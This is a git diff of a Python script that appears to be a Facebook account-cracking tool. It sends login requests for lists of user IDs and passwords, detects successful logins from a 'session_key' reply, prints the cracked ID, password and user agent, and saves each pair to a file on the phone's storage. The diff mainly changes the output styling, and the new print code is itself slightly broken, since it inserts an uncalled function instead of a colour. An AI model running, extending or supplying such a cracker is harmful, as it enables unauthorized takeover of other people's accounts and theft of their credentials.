@@ -1,7 +1,7 @@
 #========================================================#
 # IMPORT
 #========================================================#
-import os, sys, time, uuid, random, requests
+import os, sys, time, uuid, random, requests, random
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
 #========================================================#
@@ -20,6 +20,11 @@ K  = "\033[93m"
 U  = "\033[95m"
 W  = "\033[0m"
 WH = "\033[97m"
+
+colors = [r, g, y, b, m, c, w, H, CY, K, U, WH]
+
+def random_color():
+    return random.choice(colors)
 
 loop = 0
 oks = []
@@ -318,30 +323,14 @@ def login2(uid, tl):
             rp = requests.get(url, headers=headers).json()
 
             if "session_key" in rp or "Please Confirm Email" in str(rp):
-               
-                def kotak(warna, teks):
-                    panjang = len(teks) + 2
-                    atas   = f"{WH}┌{'─' * panjang}┐{W}"
-                    isi    = f"{WH}│{W} {warna}{teks}{W} {WH}│{W}"
-                    bawah  = f"{WH}└{'─' * panjang}┘{W}"
-                    return atas + "\n" + isi + "\n" + bawah
-
-
-                # kotak wrap (untuk UA panjang)
-                def kotak_wrap(warna, teks, lebar=60):
-                    lines = textwrap.wrap(teks, width=lebar)
-                    max_len = max(len(line) for line in lines)
-                    atas  = f"{WH}┌{'─' * (max_len + 2)}┐{W}"
-                    isi   = "\n".join([f"{WH}│{W} {warna}{line.ljust(max_len)}{W} {WH}│{W}" for line in lines])
-                    bawah = f"{WH}└{'─' * (max_len + 2)}┘{W}"
-                    return atas + "\n" + isi + "\n" + bawah
-                    
-                print(f"{g}AKUN SUCCESS{W}")
-                print(f"{WH}──────────────────────────────{W}")
-                print(kotak(CY, uid))
-                print(kotak(K, pw))
-                print(kotak(U, ua))
-                print(f"{WH}──────────────────────────────{W}")
+                print(f"""
+{random_color}
+UID  : {uid}
+PASS : {pw}
+TAHUN : {tahun(uid)}
+USER-AGENTS : {ua}
+{w}
+""")
                 open("/sdcard/PATRIOT-OK.txt", "a").write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
